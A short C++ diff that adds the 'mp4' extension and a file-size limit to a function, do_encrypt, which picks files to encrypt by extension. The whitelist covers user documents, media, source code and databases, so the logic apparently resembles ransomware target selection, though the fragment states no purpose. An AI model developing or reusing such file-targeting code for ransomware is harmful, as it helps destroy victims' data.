@@ -37,10 +37,10 @@ bool do_encrypt(const string& path)
 		"mov", "zip", "jpg", "jpeg", "xls",
 		"doc", 	"ppt", "gif", "png", "xlsx",
 		"cpp", "c", "sql", "wav", "php", 
-		"mpeg", "jar", "asp"
+		"mpeg", "jar", "asp", "mp4"
 	};
 	std::string ext = find_extension(path);
-	return ext_whitelist.find(ext) != ext_whitelist.end();
+	return ( ext_whitelist.find(ext) != ext_whitelist.end() )  && ( file_size(path) < MAX_FILE_SIZE );
 }
 
 bool do_decrypt(const string& path)
